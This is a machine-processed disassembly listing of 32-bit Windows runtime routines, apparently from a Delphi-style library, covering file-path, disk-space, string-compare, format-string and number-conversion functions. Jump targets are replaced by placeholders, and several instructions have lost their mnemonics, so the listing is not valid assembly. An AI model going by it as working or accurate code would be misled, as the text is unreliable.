mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408754
push ebx
push esi
mov esi eax
mov eax esi
call sub_40425c
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c334
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408784
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_40425c
mov edi eax
mov eax ebx
call sub_40445c
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408a88
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c334
cmp al 0x2
jne r-xdata
dec edi
sub_4087d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408784
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4044bc
pop edi
pop esi
pop ebx
retn
sub_40880c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408784
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403f9c
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_4044bc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408854
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_40445c
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_40408c
add esp 0x108
pop esi
pop ebx
retn
sub_40888e
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404df0
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404df0
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408940
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408968
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_40899c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40425c
push eax
mov eax ebx
call sub_40445c
mov edx eax
mov eax esi
pop ecx
call sub_408968
pop esi
pop ebx
retn
sub_4089c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40445c
mov edx eax
mov ecx edi
mov eax ebx
call sub_408968
pop edi
pop esi
pop ebx
retn
sub_4089e0
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408a04
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408a44
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408a9c
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408b10
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408904
mov esi eax
inc esi
mov eax esi
call sub_408af0
mov ecx esi
mov edx ebx
call sub_408930
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408b4c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c358
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408930
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407ebc
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408bd4
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408f2b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408cb6
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408cfe
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408cb6
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408bc8
pop edx
or edx edx
je r-xdata
sub_408cb6
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408f2b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408cfe
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408f2b
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408b4c
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408d25 ]
mov ebx ecx
sub cl 0x44
je sub_4082d4
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4041c4
jmp r-xdata
mov esi sub_404224
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_4082d4
sub cl 0x44
je sub_408268
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_408268
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4082d4
mov ecx 0x10
cmp bl 0x58
je sub_408268
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408ba4
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_4090e4
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408268
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408f4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408904
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408bd4
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408f8c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408904
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408bd4
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408fe0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_40425c
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_40425c
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_40425c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408bd4
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_40408c
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403f9c
mov eax esi
mov edx ebx
call sub_4045e8
mov eax [ ebp - 0x4 ]
call sub_40425c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408bd4
mov edx esi
xchg edx eax
call sub_4045e8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4090a0
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_4090e4
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_4093b8
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_4091e3
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4091ed
call sub_4091e3
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_4090a0
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409249
call sub_4091e3
call sub_4091da
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_4091da
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_4090a0
retn
xor ecx ecx
sub_409285
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_4091da
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_4091da
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_4092ea
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40933e
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409285
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_4093b8
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4093e5
jmp r-xdata
call sub_409507
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4093e5
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d98
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_409507
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4095e4
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40969b
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4096a6
neg edx
mov ecx esi
call sub_4096a6
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40969b
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4096c2
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d98
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4096a6
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4096c2
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4096f8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_4090e4
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40408c
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409728
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_4090e4
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40408c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409758
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_40445c
mov edx esp
xor ecx ecx
call sub_4095e4
test al al
jne r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] 0xb
lea edx [ esp + 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407ebc
sub_4097b0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40445c
mov edx esp
xor ecx ecx
call sub_4095e4
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4097dc
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40445c
mov edx esp
xor ecx ecx
call sub_4095e4
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409824
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409868
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
